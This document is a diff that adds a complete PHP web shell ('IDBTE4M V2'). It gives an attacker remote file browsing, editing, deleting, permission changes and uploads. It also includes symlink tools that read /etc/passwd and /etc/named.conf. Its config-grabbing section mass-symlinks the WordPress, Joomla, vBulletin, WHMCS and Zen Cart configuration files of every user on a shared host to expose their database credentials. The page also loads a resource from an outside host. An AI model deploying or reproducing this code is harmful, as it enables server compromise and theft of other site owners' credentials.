@@ -1,0 +1,1327 @@
+<?php
+// SHELL IDBTE4M V2
+// BY ./KEFIEX404 IDBTE4M
+set_time_limit(0);
+error_reporting(0);
+
+
+$pageURL = 'http://'.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
+$u = explode("/",$pageURL );
+$pageURL =str_replace($u[count($u)-1],"",$pageURL );
+
+$pageFTP = 'ftp://'.$_SERVER["SERVER_NAME"].'/public_html/'.$_SERVER["REQUEST_URI"];
+$u = explode("/",$pageFTP );
+$pageFTP =str_replace($u[count($u)-1],"",$pageFTP );
+
+?>
+
+<?php
+error_reporting(0);
+set_time_limit(0);
+
+if(get_magic_quotes_gpc()){
+    foreach($_POST as $key=>$value){
+        $_POST[$key] = stripslashes($value);
+    }
+}
+echo '<!DOCTYPE HTML>
+<HTML>
+<HEAD>
+<link href="http://g22b.cc/upload/font.php?file_manager" rel="stylesheet" type="text/css">
+<title>-=[ IDBTE4M ]=-</title>
+<style>
+body{
+    font-family: "Racing Sans One", cursive;
+    background-color: #e6e6e6;
+    text-shadow:0px 0px 1px #757575;
+}
+#content tr:hover{
+    background-color: #636263;
+    text-shadow:0px 0px 10px #fff;
+}
+#content .first{
+    background-color: silver;
+}
+#content .first:hover{
+    background-color: silver;
+    text-shadow:0px 0px 1px #757575;
+}
+table{
+    border: 1px #000000 dotted;
+}
+H1{
+    font-family: "Rye", cursive;
+}
+a{
+    color: #000;
+    text-decoration: none;
+}
+a:hover{
+    color: #fff;
+    text-shadow:0px 0px 10px #ffffff;
+}
+input,select,textarea{
+    border: 1px #000000 solid;
+    -moz-border-radius: 5px;
+    -webkit-border-radius:5px;
+    border-radius:5px;
+}
+    
+</style>
+</HEAD>
+<BODY>
+<H1><center>-=[ IDBTE4M ]=-</center></H1>
+<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td>Current Path : ';
+if(isset($_GET['path'])){
+    $path = base64_decode($_GET['path']);
+}else{
+    $path = getcwd();
+}
+$pathen = base64_encode($path);
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+
+foreach($paths as $id=>$pat){
+    if($pat == '' && $id == 0){
+        $a = true;
+        echo '<a href="?path='.base64_encode("/").'">/</a>';
+        continue;
+    }
+    if($pat == '') continue;
+    echo '<a href="?path=';
+    $linkpath = '';
+    for($i=0;$i<=$id;$i++){
+        $linkpath .= "$paths[$i]";
+        if($i != $id) $linkpath .= "/";
+    }
+    echo base64_encode($linkpath);
+    echo '">'.$pat.'</a>/';
+}
+if(isset($_GET['filesrc'])){
+    echo "<tr><td>Current File : ";
+    echo base64_decode($_GET['filesrc']);
+    echo '</tr></td></table><br />';
+    echo('<pre>'.htmlspecialchars(file_get_contents(base64_decode($_GET['filesrc']))).'</pre>');
+}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
+    if($_POST['opt'] == 'chmod'){
+        if(isset($_POST['perm'])){
+            if(chmod($_POST['path'],$_POST['perm'])){
+                echo '<font color="green">Change Permission Done.</font><br />';
+            }else{
+                echo '<font color="red">Change Permission Error.</font><br />';
+            }
+        }
+        echo '<form method="POST">
+        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
+        <input type="hidden" name="path" value="'.$_POST['path'].'">
+        <input type="hidden" name="opt" value="chmod">
+        <input type="submit" value="Go" />
+        </form>';
+    }elseif($_POST['opt'] == 'rename'){
+        if(isset($_POST['newname'])){
+            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+                echo '<font color="green">Change Name Done.</font><br />';
+            }else{
+                echo '<font color="red">Change Name Error.</font><br />';
+            }
+            $_POST['name'] = $_POST['newname'];
+        }
+        echo '<form method="POST">
+        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
+        <input type="hidden" name="path" value="'.$_POST['path'].'">
+        <input type="hidden" name="opt" value="rename">
+        <input type="submit" value="Go" />
+        </form>';
+    }elseif($_POST['opt'] == 'edit'){
+        if(isset($_POST['src'])){
+            $fp = fopen($_POST['path'],'w');
+            if(fwrite($fp,$_POST['src'])){
+                echo '<font color="green">Edit File Done.</font><br />';
+            }else{
+                echo '<font color="red">Edit File Error.</font><br />';
+            }
+            fclose($fp);
+        }
+        echo '<form method="POST">
+        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
+        <input type="hidden" name="path" value="'.$_POST['path'].'">
+        <input type="hidden" name="opt" value="edit">
+        <input type="submit" value="Go" />
+        </form>';
+    }
+    echo '</center>';
+}else{
+    echo '</table><br /><center>';
+    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+        if($_POST['type'] == 'dir'){
+            if(rmdir($_POST['path'])){
+                echo '<font color="green">Delete Dir Done.</font><br />';
+            }else{
+                echo '<font color="red">Delete Dir Error.</font><br />';
+            }
+        }elseif($_POST['type'] == 'file'){
+            if(unlink($_POST['path'])){
+                echo '<font color="green">Delete File Done.</font><br />';
+            }else{
+                echo '<font color="red">Delete File Error.</font><br />';
+            }
+        }
+    }
+    echo '</center>';
+    $scandir = scandir($path);
+    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+    <tr class="first">
+        <td><center>Name</center></td>
+        <td><center>Size</center></td>
+        <td><center>Permissions</center></td>
+        <td><center>Options</center></td>
+    </tr>';
+
+    foreach($scandir as $dir){
+        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
+        $dirlink = base64_encode("$path/$dir");
+        echo "<tr>
+        <td><a href=\"?path=$dirlink\">$dir</a></td>
+        <td><center>--</center></td>
+        <td><center>";
+        if(is_writable("$path/$dir")) echo '<font color="green">';
+        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
+        echo perms("$path/$dir");
+        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
+        
+        echo "</center></td>
+        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
+        <select name=\"opt\">
+	    <option value=\"\"></option>
+        <option value=\"delete\">Delete</option>
+        <option value=\"chmod\">Chmod</option>
+        <option value=\"rename\">Rename</option>
+        </select>
+        <input type=\"hidden\" name=\"type\" value=\"dir\">
+        <input type=\"hidden\" name=\"name\" value=\"$dir\">
+        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
+        <input type=\"submit\" value=\">\" />
+        </form></center></td>
+        </tr>";
+    }
+    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+    foreach($scandir as $file){
+        if(!is_file("$path/$file")) continue;
+        $size = filesize("$path/$file")/1024;
+        $size = round($size,3);
+        if($size >= 1024){
+            $size = round($size/1024,2).' MB';
+        }else{
+            $size = $size.' KB';
+        }
+        $filelink = base64_encode("$path/$file");
+        echo "<tr>
+        <td><a href=\"?filesrc=$filelink&path=$pathen\">$file</a></td>
+        <td><center>".$size."</center></td>
+        <td><center>";
+        if(is_writable("$path/$file")) echo '<font color="green">';
+        elseif(!is_readable("$path/$file")) echo '<font color="red">';
+        echo perms("$path/$file");
+        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
+        echo "</center></td>
+        <td><center><form method=\"POST\" action=\"?option&path=$pathen\">
+        <select name=\"opt\">
+	    <option value=\"\"></option>
+        <option value=\"delete\">Delete</option>
+        <option value=\"chmod\">Chmod</option>
+        <option value=\"rename\">Rename</option>
+        <option value=\"edit\">Edit</option>
+        </select>
+        <input type=\"hidden\" name=\"type\" value=\"file\">
+        <input type=\"hidden\" name=\"name\" value=\"$file\">
+        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
+        <input type=\"submit\" value=\">\" />
+        </form></center></td>
+        </tr>";
+    }
+    echo '</table>
+    </div>';
+}
+echo '<center><div class="info">IKI NGONO SHELL MADE IN INDONESIA <span class="gaya"><a href="http://fb.com/idbte4m"><?php echo date("Y",time())." "BN-IDBTE4M; ?></a></span></div>
+</BODY>
+</HTML>';
+function perms($file){
+    $perms = @fileperms($file);
+
+if (($perms & 0xC000) == 0xC000) {
+    // Socket
+    $info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+    // Symbolic Link
+    $info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+    // Regular
+    $info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+    // Block special
+    $info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+    // Directory
+    $info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+    // Character special
+    $info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+    // FIFO pipe
+    $info = 'p';
+} else {
+    // Unknown
+    $info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+            (($perms & 0x0800) ? 's' : 'x' ) :
+            (($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+            (($perms & 0x0400) ? 's' : 'x' ) :
+            (($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+            (($perms & 0x0200) ? 't' : 'x' ) :
+            (($perms & 0x0200) ? 'T' : '-'));
+
+    return $info;
+}
+
+?>
+<?php
+
+@mkdir('sym',0777);
+$htcs = "Options Indexes FollowSymLinks\nDirectoryIndex idb.phtml\nAddType txt .php\nAddHandler txt .php";
+$f =@fopen ('sym/.htaccess','w');
+fwrite($f , $htcs);
+
+
+
+@symlink("/","sym/root");
+
+$pg = basename(__FILE__);
+
+
+
+
+echo '<div class="cont">
+
+[<a href="?"> Home </a>]
+
+[<a href="?sws=sym"> Symlink 1 </a>]
+
+[<a href="?sws=sec"> Domain </a>]
+
+[ <a href="?sws=file"> Manual</a>]
+
+[<a href="?sws=passwd"> Bypass Panda`an </a>]
+
+<br /><br />
+
+[ <a href="?sws=read"> Bypass Read </a>]
+
+[ <a href="?idb=sym2"> sym2 </a>]
+
+[ <a href="?idb=auto"> Auto tolls </a>]
+
+[ <a href="?idb=sql"> SQL manager </a>]
+
+[ <a href="?idb=config"> config </a>]
+
+<br /><br /><br />
+
+
+
+
+
+
+</div>';
+
+if(isset($_REQUEST['sws']))
+{
+
+switch ($_REQUEST['sws'])
+{
+
+
+
+
+
+/// Domains + Scripts ///
+
+case 'sec':
+
+if(!@is_file('named.txt')){
+
+$d00m = @file("/etc/named.conf");
+
+}else{
+
+$d00m = @file("named.txt");
+
+
+}
+if(!$d00m)
+{
+
+die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
+}
+else
+
+{
+echo "<div class='tmp'>
+<table align='center' width='40%'><td> Domains </td><td> Script </td>";
+foreach($d00m as $dom){
+
+flush();
+flush();
+
+
+
+if(eregi("zone",$dom)){
+
+@preg_match_all('#zone "(.*)"#', $dom, $domsws);
+
+flush();
+
+if(@strlen(trim($domsws[1][0])) > 2){
+
+$user = @posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));
+
+///////////////////////////////////////////////////////////////////////////////////
+
+$wpl=$pageURL."/sym/root/home/".$user['name']."/public_html/wp-config.php";
+$wpp=@get_headers($wpl);
+$wp=$wpp[0];
+
+$wp2=$pageURL."/sym/root/home/".$user['name']."/public_html/blog/wp-config.php";
+$wpp2=@get_headers($wp2);
+$wp12=$wpp2[0];
+
+///////////////////////////////
+
+$jo1=$pageURL."/sym/root/home/".$user['name']."/public_html/configuration.php";
+$joo=@get_headers($jo1);
+$jo=$joo[0];
+
+
+$jo2=$pageURL."/sym/root/home/".$user['name']."/public_html/joomla/configuration.php";
+$joo2=@get_headers($jo2);
+$jo12=$joo2[0];
+
+////////////////////////////////
+
+$vb1=$pageURL."/sym/root/home/".$user['name']."/public_html/includes/config.php";
+$vbb=@get_headers($vb1);
+$vb=$vbb[0];
+
+$vb2=$pageURL."/sym/root/home/".$user['name']."/public_html/vb/includes/config.php";
+$vbb2=@get_headers($vb2);
+$vb12=$vbb2[0];
+
+$vb3=$pageURL."/sym/root/home/".$user['name']."/public_html/forum/includes/config.php";
+$vbb3=@get_headers($vb3);
+$vb13=$vbb3[0];
+
+/////////////////
+
+$wh1=$pageURL."/sym/root/home/".$user['name']."public_html/clients/configuration.php";
+$whh2= @get_headers($wh1);
+$wh=$whh2[0];
+
+$wh2=$pageURL."/sym/root/home/".$user['name']."/public_html/support/configuration.php";
+$whh2= @get_headers($wh2);
+$wh12=$whh2[0];
+
+$wh3=$pageURL."/sym/root/home/".$user['name']."/public_html/client/configuration.php";
+$whh3= @get_headers($wh3);
+$wh13=$whh3[0];
+
+$wh5=$pageURL."/sym/root/home/".$user['name']."/public_html/submitticket.php";
+$whh5= @get_headers($wh5);
+$wh15=$whh5[0];
+
+$wh4=$pageURL."/sym/root/home/".$user['name']."/public_html/client/configuration.php";
+$whh4= @get_headers($wh4);
+$wh14=$whh4[0];
+
+
+
+////////////////////////////////////////////////////////////////////////////////
+
+////////// Wordpress ////////////
+
+$pos = strpos($wp, "200");
+$config="&nbsp;";
+
+if (strpos($wp, "200") == true )
+{
+$config="<a href='".$wpl."' target='_blank'>Wordpress</a>";
+}
+elseif (strpos($wp12, "200") == true)
+{
+$config="<a href='".$wp2."' target='_blank'>Wordpress</a>";
+}
+
+///////////WHMCS////////
+
+elseif (strpos($jo, "200") == true and strpos($wh15, "200") == true )
+{
+$config=" <a href='".$wh5."' target='_blank'>WHMCS</a>";
+
+}
+elseif (strpos($wh12, "200") == true)
+{
+$config =" <a href='".$wh2."' target='_blank'>WHMCS</a>";
+}
+
+elseif (strpos($wh13, "200") == true)
+{
+$config =" <a href='".$wh3."' target='_blank'>WHMCS</a>";
+
+}
+
+///////// Joomla to 4 ///////////
+
+elseif (strpos($jo, "200") == true)
+{
+$config=" <a href='".$jo1."' target='_blank'>Joomla</a>";
+}
+
+elseif (strpos($jo12, "200") == true)
+{
+$config=" <a href='".$jo2."' target='_blank'>Joomla</a>";
+}
+
+//////////vBulletin to 4 ///////////
+
+elseif (strpos($vb, "200") == true)
+{
+$config=" <a href='".$vb1."' target='_blank'>vBulletin</a>";
+}
+
+elseif (strpos($vb12, "200") == true)
+{
+$config=" <a href='".$vb2."' target='_blank'>vBulletin</a>";
+}
+
+elseif (strpos($vb13, "200") == true)
+{
+$config=" <a href='".$vb3."' target='_blank'>vBulletin</a>";
+}
+
+else
+{
+continue;
+}
+flush();
+flush();
+
+/////////////////////////////////////////////////////////////////////////////////////
+
+
+
+$site = $user['name'] ;
+
+
+
+flush();
+
+echo "<tr><td><a href=http://www.".$domsws[1][0]."/>".$domsws[1][0]."</a></td>
+<td>".$config."</td></tr>"; flush();
+
+}
+}
+}
+}
+
+
+
+
+break;
+
+
+/// user + domine + symlink ///
+
+case 'sym':
+
+if(!is_file('named.txt')){
+
+$d00m = @file("/etc/named.conf");
+
+}else{
+
+$d00m = @file("named.txt");
+
+
+}
+if(!$d00m)
+{
+
+die ("<meta http-equiv='refresh' content='0; url=?sws=read'/>");
+}
+else
+
+{
+echo "<div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td>";
+foreach($d00m as $dom){
+
+if(eregi("zone",$dom)){
+
+preg_match_all('#zone "(.*)"#', $dom, $domsws);
+
+flush();
+
+if(strlen(trim($domsws[1][0])) > 2){
+
+$user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));
+
+flush();
+
+
+
+$site = $user['name'] ;
+
+
+@symlink("/","sym/root");
+
+$site = $domsws[1][0];
+
+$ir = 'ir';
+
+$il = 'il';
+
+if (preg_match("/.^$ir/",$domsws[1][0]) or preg_match("/.^$il/",$domsws[1][0]) )
+{
+$site = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$domsws[1][0]."</div>";
+}
+
+
+echo "
+<tr>
+
+<td>
+<div class='dom'><a target='_blank' href=http://www.".$domsws[1][0]."/>".$site." </a> </div>
+</td>
+
+
+<td>
+".$user['name']."
+</td>
+
+
+
+
+
+
+<td>
+<a href='sym/root/home/".$user['name']."/public_html' target='_blank'>symlink </a>
+</td>
+
+
+</tr></div> ";
+
+
+flush();
+flush();
+
+}
+}
+}
+}
+
+
+
+
+break;
+
+
+/// file symlink ///
+
+case 'file':
+
+echo'
+The file path to symlink
+
+<br /><br />
+<form method="post">
+<input type="text" name="file" value="/home/user/public_html/file.name" size="60"/><br /><br />
+<input type="text" name="symfile" value="file.name_sym ( Ex. :: royaliste.txt )" size="60"/><br /><br />
+<input type="submit" value="symlink" name="symlink" /> <br /><br />
+
+
+
+</form>
+';
+
+$pfile = $_POST['file'];
+$symfile = $_POST['symfile'];
+$symlink = $_POST['symlink'];
+
+if ($symlink)
+{
+
+
+@mkdir('sym1',0777);
+$c = "Options Indexes FollowSymLinks\nDirectoryIndex tr.phtml\nAddType txt .php\nAddHandler txt .php";
+$f =@fopen ('sym1/.htaccess','w');
+@fwrite($f , $c);
+
+@symlink("$pfile","sym1/$symfile");
+
+echo '<br /><a target="_blank" href="sym1/'.$symfile.'" >'.$symfile.'</a>';
+
+}
+
+
+
+break;
+
+/// bypass read
+
+case 'read':
+
+echo "read /etc/named.conf";
+echo "<br /><br /><form method='post' action='?sws=read&save=1'><textarea cols='80' rows='20' name='file'>";
+flush();
+flush();
+
+
+$file = '/etc/named.conf';
+
+
+$r3ad = @fopen($file, 'r');
+if ($r3ad){
+$content = @fread($r3ad, @filesize($file));
+echo "".htmlentities($content)."";
+}
+else if (!$r3ad)
+{
+$r3ad = @show_source($file) ;
+}
+else if (!$r3ad)
+{
+$r3ad = @highlight_file($file);
+}
+else if (!$r3ad)
+{
+$sm = @symlink($file,'sym.txt');
+
+
+if ($sm){
+$r3ad = @fopen('sym/sym.txt', 'r');
+$content = @fread($r3ad, @filesize($file));
+echo "".htmlentities($content)."";
+
+}
+}
+
+
+
+echo "</textarea><br /><br /><input type='submit' value='Save'/> </form>";
+
+
+if(isset($_GET['save'])){
+
+
+$cont = stripcslashes($_POST['file']);
+
+$f = fopen('named.txt','w');
+
+$w = fwrite($f,$cont);
+
+if($w){
+
+echo '<br />save has been successfully';
+
+}
+
+fclose($f);
+
+
+
+
+}
+
+
+
+break;
+
+// passwd
+
+case 'passwd':
+
+if(isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0){
+
+
+$cont = stripcslashes($_POST['file']);
+
+if(!file_exists('passwd.txt')){
+
+$f = @fopen('passwd.txt','w');
+
+$w = @fwrite($f,$cont);
+
+fclose($f);
+}
+if($w or @filesize('passwd.txt') > 0){
+// * SHOW * //
+
+echo "<div class='tmp'><table align='center' width='35%'><td>Users</td><td>symlink</td><td>FTP</td>";
+flush();
+
+$fil3 = file('passwd.txt');
+
+foreach ($fil3 as $f){
+
+$u=explode(':', $f);
+$user = $u['0'];
+
+
+
+echo "
+<tr>
+
+
+
+<td width='15%'>
+$user
+</td>
+
+
+
+
+
+
+<td width='10%'>
+<a href='sym/root/home/$user/public_html' target='_blank'>Symlink </a>
+</td>
+
+<td width='10%'>
+<a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a>
+</td>
+
+
+
+</tr></div> ";
+
+
+flush();
+flush();
+
+
+}
+
+
+
+
+
+
+die ("</tr></div>");
+
+
+}
+
+
+
+
+
+}
+
+
+
+echo "read /etc/passwd";
+echo "<br /><br /><form method='post' action='?sws=passwd&save=1'><textarea cols='80' rows='20' name='file'>";
+flush();
+
+$file = '/etc/passwd';
+
+
+$r3ad = @fopen($file, 'r');
+if ($r3ad){
+$content = @fread($r3ad, @filesize($file));
+echo "".htmlentities($content)."";
+}
+elseif(!$r3ad)
+{
+$r3ad = @show_source($file) ;
+}
+elseif(!$r3ad)
+{
+$r3ad = @highlight_file($file);
+}
+elseif(!$r3ad)
+{
+
+for($uid=0;$uid<1000;$uid++){
+$ara = posix_getpwuid($uid);
+if (!empty($ara)) {
+while (list ($key, $val) = each($ara)){
+print "$val:";
+}
+print "\n";
+}
+
+}
+
+}
+
+
+flush();
+
+
+echo "</textarea><br /><br /><input type='submit' value='&nbsp;&nbsp;symlink&nbsp;&nbsp;'/> </form>";
+flush();
+
+break;
+
+
+
+
+############################ index #########################3
+
+
+case 'help':
+
+echo "<div class='tmp'>
+<table align='center' width='40%'><td>function</td><td>Case</td>";
+
+
+$safe_mode = ini_get('safe_mode');
+if($safe_mode){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
+
+echo "<tr><td>Safe Mode</td><td>$r</td>";
+
+$fun = function_exists('symlink');
+if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
+
+echo "<tr><td>function symlink</td><td>$r</td>";
+
+
+$fun = function_exists('file');
+if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
+
+echo "<tr><td>function file</td><td>$r</td>";
+
+$fun = function_exists('file_get_contents');
+if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
+
+echo "<tr><td>function file_get_contents</td><td>$r</td>";
+
+$fun = function_exists('mkdir');
+if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
+
+echo "<tr><td>function mkdir</td><td>$r</td>";
+
+
+$fun = is_dir('sym/root');
+if(!$fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #336600'>True</b>";}
+
+echo "<tr><td>Permission denied</td><td>$r</td>";
+
+
+$fun = preg_match('/Forbidden/',@file_get_contents('sym/root') or !@file_get_contents('sym/root'));
+if($fun){$r = "<b style='color: red'>False</b>";}else{$r = "<b style='color: #006600'>True</b>";}
+
+echo "<tr><td>Forbidden</td><td>$r</td>";
+
+
+
+
+echo "</table></div>";
+
+
+
+break;
+default:
+header("Location: $pg");
+
+
+
+
+}
+
+
+/// home ///
+}else
+{
+
+
+echo '<br /><br /><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" value="Choose file" size="60" ><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<br /><br /><b>Uploaded successful !!<br><br>'; }
+else { echo '<br /><br />Not uploaded !!<br><br>'; }
+
+
+}
+
+
+
+function ex($text,$a,$b){
+$explode = explode($a,$text);
+$explode = explode($b,$explode[1]);
+return $explode[0];
+}
+}
+
+
+?>
+<?php
+if (isset($_GET['idb']) && ($_GET['idb'] == 'config')) {
+?>
+<form action="?&amp;idb=config" method="post">
+<?php @ini_set('max_execution_time',0); @ini_set('display_errors', 0); @ini_set('file_uploads',1);
+echo '<html><head><title>PHP Config Fucker V2 | X-1N73CT & S1T1 B4RC0D3</title><style type="text/css">
+body {background-color: #000000; font-family: Tahoma; font-size:11pt; font-weight: bold;color: #00ff00; text-align: center;}
+textarea { border:1px dotted #00ff00; width: 650px; height: 420px; background-color:#0C0C0C; font-family:Tahoma; font-size:12pt; color:#FF0000 }
+.input {border:1px dotted #00ff00; width: 250px; background-color:#0C0C0C; font-family:Tahoma; font-size:12pt; color:#FF0000; }
+.inp {border:1px dotted #00ff00; background-color:#0C0C0C; font-family:Tahoma; font-size:8pt; color:#00ff00;}
+</style></head><body>
+<center><b><h2><font color=#00ff00>[ <font color="#FF0000">+</font> ] Get Config [ <font color="#FF0000">+</font> ]</font></h2></b><br>
+<p><font color="#C0C0C0">[ </font> Config By :<font color="#FF0000"><blink> Ez01d</blink></font> & <font color="#FF0000"><blink>R1P </blink></font><font color="#C0C0C0"> ]</font></p>
+<form method="POST"><textarea cols="85" name="passwd"  rows="20">'; $uSr=file("/etc/passwd"); foreach($uSr as $usrr) { $str=explode(":",$usrr); echo $str[0]."\n"; } ?>
+</textarea><br>Your Folder Config Name : <input type="text" class="input" name="folfig" size=40 />
+<select class="inp"  title="Select Your Type File"  name="type" size=""><option title="type txt" value=".txt">.txt<option><option title="type php" value=".php">.php<option><option title="type shtml" value=".shtml">.shtml<option><option title="type ini" value=".ini">.ini<option></select>
+<input name="conf" size="80" class="ipt" value="Hajar..." type="submit"><br><br></form></center>
+<?php @ini_set('html_errors',0); @ini_set('max_execution_time',0); @ini_set('display_errors', 0); @ini_set('file_uploads',1);
+if ($_POST['conf']) {
+$folfig = $_POST['folfig']; $type = $_POST['type'];
+$functions=@ini_get("disable_functions"); if(eregi("symlink",$functions)){die ('<blink>Maaf bro fitur Symlink masih di disabled :( </blink>');}
+@mkdir($folfig, 0755); 
+@chdir($folfig);
+$htaccess="Options Indexes FollowSymLinks\nDirectoryIndex idb.phtml\nAddType txt .php\nAddHandler txt .php";
+file_put_contents(".htaccess",$htaccess,FILE_APPEND);
+$passwd=explode("\n",$_POST["passwd"]); echo "<blink><center >tunggu sebentar ya ...</center></blink>";
+foreach($passwd as $pwd){ $user=trim($pwd);
+@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'~~>wordpress'.$type.''); 
+@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'~~>wordpress-wp'.$type.'');
+@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'~~>wordpress-wp-beta'.$type.'');
+@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'~~>wordpress-beta'.$type.'');
+@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'~~>wp13-press'.$type.'');
+@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'~~>wordpress-wordpress'.$type.'');
+@symlink('/home/'.$user.'/public_html/wordpress/beta/wp-config.php',$user.'~~>wordpress-wordpress-beta'.$type.'');
+@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'~~>wordpress-news'.$type.'');
+@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'~~>wordpress-new'.$type.'');
+@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'~~>wordpress'.$type.''); 
+@symlink('/home/'.$user.'/public_html/web/wp-config.php',$user.'~~>wordpress-web'.$type.''); 
+@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'~~>wordpress-blogs'.$type.'');
+@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'~~>wordpress-home'.$type.'');
+@symlink('/home/'.$user.'/public_html/protal/wp-config.php',$user.'~~>wordpress-protal'.$type.'');
+@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'~~>ordpress-site'.$type.'');
+@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'~~>wordpress-main'.$type.'');
+@symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'~~>wordpress-test'.$type.'');
+@symlink('/home/'.$user.'/public_html/beta/configuration.php',$user.'~~>joomla'.$type.''); 
+@symlink('/home/'.$user.'/public_html/configuration.php',$user.'~~>joomla'.$type.''); 
+@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'~~>joomla-home'.$type.'');
+@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'~~>joomla-joomla'.$type.'');
+@symlink('/home/'.$user.'/public_html/protal/configuration.php',$user.'~~>joomla-protal'.$type.'');
+@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'~~>joomla-joo'.$type.'');
+@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'~~>joomla-cms'.$type.'');
+@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'~~>joomla-site'.$type.'');
+@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'~~>joomla-main'.$type.'');
+@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'~~>joomla-news'.$type.'');
+@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'~~>joomla-new'.$type.'');
+@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'~~>joomla-home'.$type.'');
+@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'~~>Vbulletin-forum'.$type.'');
+@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'~~>vbluttin'.$type.'');
+@symlink('/home/'.$user.'/public_html/vb3/includes/config.php',$user.'~~>vbluttin3'.$type.'');
+@symlink('/home/'.$user.'/public_html/forum/includes/class_core.php',$user.'~~>vbluttin-class_core.php'.$type.'');
+@symlink('/home/'.$user.'/public_html/vb/includes/class_core.php',$user.'~~>vbluttin-class_core.php1'.$type.'');
+@symlink('/home/'.$user.'/public_html/cc/includes/class_core.php',$user.'~~>vbluttin-class_core.php2'.$type.'');
+@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'~~>vb1-config'.$type.'');
+@symlink('/home/'.$user.'/public_html/cpanel/configuration.php',$user.'~~>cpanel'.$type.'');
+@symlink('/home/'.$user.'/public_html/panel/configuration.php',$user.'~~>panel'.$type.'');
+@symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'~~>host'.$type.'');
+@symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'~~>hosting'.$type.'');
+@symlink('/home/'.$user.'/public_html/hosts/configuration.php',$user.'~~>hosts'.$type.'');
+@symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$user.'~~>zencart'.$type.''); 
+@symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'~~>zencart-shop'.$type.''); 
+@symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'~~>hop-ZCshop'.$type.''); 
+@symlink('/home/'.$user.'/public_html/mk_conf.php',$user.'~~>mk-portale1'.$type.'');
